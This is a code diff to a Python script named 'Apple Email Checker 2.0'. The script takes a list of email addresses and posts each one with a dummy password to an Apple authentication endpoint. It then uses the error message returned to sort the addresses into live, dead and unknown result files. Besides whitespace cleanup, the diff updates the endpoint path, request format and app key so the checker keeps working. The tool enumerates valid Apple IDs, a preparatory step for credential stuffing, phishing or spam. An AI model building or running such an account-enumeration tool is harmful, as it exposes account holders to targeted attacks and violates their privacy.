@@ -12,19 +12,19 @@ class Apple():
 	ua 			= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
 	live 		= 'Access denied. Your account does not have permission to access this application.'.encode()
 	die 		= 'Your Apple ID or password was entered incorrectly.'.encode()
-	version 	= 'Apple Email Checker 2.0' 
+	version 	= 'Apple Email Checker 2.0'
 	input_queue = queue.Queue()
-	
+
 
 	def __init__(self):
 
 		print(r"""
-     _                _      _____ __  __       _ _  ____ _               _                     ____    ___  
-    / \   _ __  _ __ | | ___| ____|  \/  | __ _(_) |/ ___| |__   ___  ___| | _____ _ __  __   _|___ \  / _ \ 
+     _                _      _____ __  __       _ _  ____ _               _                     ____    ___
+    / \   _ __  _ __ | | ___| ____|  \/  | __ _(_) |/ ___| |__   ___  ___| | _____ _ __  __   _|___ \  / _ \
    / _ \ | '_ \| '_ \| |/ _ \  _| | |\/| |/ _` | | | |   | '_ \ / _ \/ __| |/ / _ \ '__| \ \ / / __) || | | |
   / ___ \| |_) | |_) | |  __/ |___| |  | | (_| | | | |___| | | |  __/ (__|   <  __/ |     \ V / / __/ | |_| |
- /_/   \_\ .__/| .__/|_|\___|_____|_|  |_|\__,_|_|_|\____|_| |_|\___|\___|_|\_\___|_|      \_/ |_____(_)___/ 
-         |_|   |_|                                                                                           
+ /_/   \_\ .__/| .__/|_|\___|_____|_|  |_|\__,_|_|_|\____|_| |_|\___|\___|_|\_\___|_|      \_/ |_____(_)___/
+         |_|   |_|
 		""")
 
 		self.mailist = input(" -> Enter Mailist : ")
@@ -46,12 +46,12 @@ class Apple():
 
 	def post_email(self,eml):
 
-		r = requests.post('https://idmsac.apple.com/authenticate', 
-					params={
-						'accountPassword':'x',
+		r = requests.post('https://idmsac.apple.com/IDMSWebAuth/authenticate',
+					data={
+						'accountPassword':'xxxxxxx',
 						'appleId':eml,
-						'appIdKey':'3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d'
-						}, 
+						'appIdKey':'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8'
+						},
 					headers={'User-Agent': self.ua}
 				)
 		if self.live in r.content: return 'live'
@@ -65,19 +65,19 @@ class Apple():
 			eml = self.input_queue.get()
 			rez = self.post_email(eml)
 
-			if rez == 'live': 
+			if rez == 'live':
 				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- LIVE - '+eml)
-				self.save_to_file('rezult/live.txt',eml+'\n') 
+				self.save_to_file('rezult/live.txt',eml+'\n')
 			elif rez == 'die':
-				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- DEAD - '+eml) 
-				self.save_to_file('rezult/die.txt',eml+'\n') 
-			elif rez == 'unknown': 
+				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- DEAD - '+eml)
+				self.save_to_file('rezult/die.txt',eml+'\n')
+			elif rez == 'unknown':
 				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- UNKN - '+eml)
-				self.save_to_file('rezult/unknown.txt',eml+'\n') 
+				self.save_to_file('rezult/unknown.txt',eml+'\n')
 
 			self.input_queue.task_done()
 
-	def run_thread(self):	
+	def run_thread(self):
 
 		self.start_time = time.time()
 
